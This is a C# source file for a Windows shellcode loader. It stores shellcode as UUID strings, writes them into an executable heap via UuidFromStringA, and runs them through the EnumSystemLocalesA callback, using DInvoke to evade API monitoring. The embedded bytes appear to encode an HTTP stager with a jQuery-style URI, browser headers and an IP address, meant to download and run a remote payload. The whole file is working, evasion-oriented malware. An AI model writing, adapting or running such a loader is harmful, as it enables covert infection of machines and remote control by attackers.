using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using DInvoke;

namespace UuidShellcode
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = false)] static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);
        static void Main(string[] args)
        {
            var HeapCreateHandle = HeapCreate((uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero);
            var heapAddr = HeapAlloc(HeapCreateHandle, (uint)0, (uint)0x100000);

            string[] uuids ={
                "0089e8fc-0000-8960-e531-d2648b52308b","528b0c52-8b14-2872-0fb7-4a2631ff31c0","7c613cac-2c02-c120-cf0d-01c7e2f05257","8b10528b-3c42-d001-8b40-7885c0744a01","488b50d0-8b18-2058-01d3-e33c498b348b","ff31d601-c031-c1ac-cf0d-01c738e075f4","3bf87d03-247d-e275-588b-582401d3668b","588b4b0c-011c-8bd3-048b-01d089442424","59615b5b-515a-e0ff-585f-5a8b12eb865d","74656e68-6800-6977-6e69-54684c772607","00e8d5ff-0000-3100-ff57-57575757683a","ffa77956-e9d5-00a4-0000-5b31c951516a","68515103-20fb-0000-5350-6857899fc6ff","8ce950d5-0000-5b00-31d2-52680032c084","53525252-5052-eb68-552e-3bffd589c683","806850c3-0033-8900-e06a-04506a1f5668","869e4675-d5ff-315f-ff57-576aff535668","7b18062d-d5ff-c085-0f84-ca01000031ff","0474f685-f989-09eb-68aa-c5e25dffd589","214568c1-315e-d5ff-31ff-576a07515650","e057b768-ff0b-bfd5-002f-000039c77507","7be95058-ffff-31ff-ffe9-91010000e9c9","e8000001-ff6f-ffff-2f6a-71756572792d","2e332e33-2e31-6c73-696d-2e6d696e2e6a","6cbb0073-1c3b-8b3c-1e72-d93e3f859ee7","94cc0b62-20fa-7a51-8f01-71d337c7a19e","a9581db4-2430-7f46-27d2-dd32c9d809a1","3cef1e2a-bcae-0038-4163-636570743a20","74786574-682f-6d74-6c2c-6170706c6963","6f697461-2f6e-6878-746d-6c2b786d6c2c","6c707061-6369-7461-696f-6e2f786d6c3b","2e303d71-2c39-2f2a-2a3b-713d302e380d","6363410a-7065-2d74-4c61-6e6775616765","6e65203a-552d-2c53-656e-3b713d302e35","6f480a0d-7473-203a-7570-646174652d64","692e636f-666e-0d6f-0a41-63636570742d","6f636e45-6964-676e-3a20-677a69702c20","6c666564-7461-0d65-0a55-7365722d4167","3a746e65-4d20-7a6f-696c-6c612f352e30","614d2820-6963-746e-6f73-683b20496e74","4d206c65-6361-4f20-5320-582031305f31","34315f35-355f-2029-4170-706c65576562","2f74694b-3335-2e37-3336-20284b48544d","6c202c4c-6b69-2065-4765-636b6f292043","6d6f7268-2f65-3438-2e30-2e343134372e","20353331-6153-6166-7269-2f3533372e33","000a0d36-8410-00ec-68f0-b5a256ffd56a","10006840-0000-0068-0040-00576858a453","93d5ffe5-afb9-000f-0001-d9515389e757","00200068-5300-6856-1296-89e2ffd585c0","078bc674-c301-c085-75e5-58c3e889fdff","363031ff-352e-2e32-3135-322e32353300","6dbf0951-9090-9090-9090-909090909090",
            };

            IntPtr pkernel32 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr prpcrt4 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("rpcrt4.dll");
            IntPtr pEnumSystemLocalesA = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "EnumSystemLocalesA");
            IntPtr pUuidFromStringA = DInvoke.DynamicInvoke.Generic.GetExportAddress(prpcrt4, "UuidFromStringA");

            IntPtr newHeapAddr = IntPtr.Zero;
            for (int i = 0; i < uuids.Length; i++)
            {
                newHeapAddr = IntPtr.Add(HeapCreateHandle, 16 * i);
                object[] uuidFromStringAParam = { uuids[i], newHeapAddr };
                var status = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pUuidFromStringA, typeof(DELEGATE.UuidFromStringA), ref uuidFromStringAParam);
            }

            object[] enumSystemLocalesAParam = { HeapCreateHandle, 0 };
            var result = DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA), ref enumSystemLocalesAParam);
        }
    }
    public class DELEGATE
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr UuidFromStringA(string StringUuid, IntPtr heapPointer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags);
    }
}
